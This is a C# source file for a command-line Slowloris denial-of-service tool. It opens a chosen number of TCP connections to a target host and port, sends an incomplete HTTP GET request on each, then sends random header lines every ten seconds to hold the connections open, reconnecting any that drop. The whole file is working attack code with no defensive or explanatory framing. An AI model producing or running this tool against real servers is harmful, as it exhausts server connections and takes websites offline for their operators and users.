using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Threading;

namespace SlowLoris
{
    public class Program
    {
        public static void Main(string[] args)
        {
            new ConsoleRectangle(30, 7, new Point(10,0), ConsoleColor.Green).Draw();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.ResetColor();

            var serverIP = "127.0.0.1";
            var port = 80;
            var socketCount = 200;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h")
                    serverIP = args[i + 1];
                if (args[i] == "-p" && int.TryParse(args[i + 1], out int defPort))
                    port = defPort;
                if(args[i] == "-p" && !int.TryParse(args[i + 1], out _))
                    Console.WriteLine("The port have to be a number");
                if (args[i] == "-c" && int.TryParse(args[i + 1], out int socketcount))
                    socketCount = socketcount;
                if(args[i] == "-c" && !int.TryParse(args[i + 1], out _))
                    Console.WriteLine("The socket count have to be a number");
            }

            try
            {
                var sockets = new List<TcpClient>();
                var header = "GET / HTTP/1.1\r\n";    //$"GET /{new Random().Next(0,3000)} HTTP/1.1\r\n";

                Console.WriteLine("Started to create the sockets...");
                for (int i = 0; i < socketCount; i++)
                    sockets.Add(ConfigureClient());


                Console.WriteLine("Press ESC to close all of the sockets and stop!");
                do
                {
                    while (!Console.KeyAvailable)
                    {
                        Console.WriteLine($"[{DateTime.Now}]  Trying to send keep-alive headers... Socket count: {sockets.Count}");
                        for (int i = 0; i < sockets.Count; i++)
                        {
                            var data = System.Text.Encoding.UTF8.GetBytes($"X-a: {new Random().Next(0, 6000)}\r\n");
                            try
                            {
                                sockets[i].GetStream().Write(data,0, data.Length);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.Message);
                                sockets[i].Close();
                                sockets.Remove(sockets[i]);
                                sockets.Add(ConfigureClient());
                            }
                        }
                        Console.WriteLine("Keep-alive headers sent, now we wait 10 seconds!");
                        Thread.Sleep(10000);
                    }
                } while (Console.ReadKey(true).Key != ConsoleKey.Escape);

                foreach (var socket in sockets)
                    socket.Close();

                sockets.Clear();

                TcpClient ConfigureClient()
                {
                    var tcpClient = new TcpClient(serverIP, port);
                    byte[] data = System.Text.Encoding.UTF8.GetBytes(header);
                    NetworkStream stream = tcpClient.GetStream(); 
                    stream.Write(data, 0, data.Length);
                    return tcpClient;
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
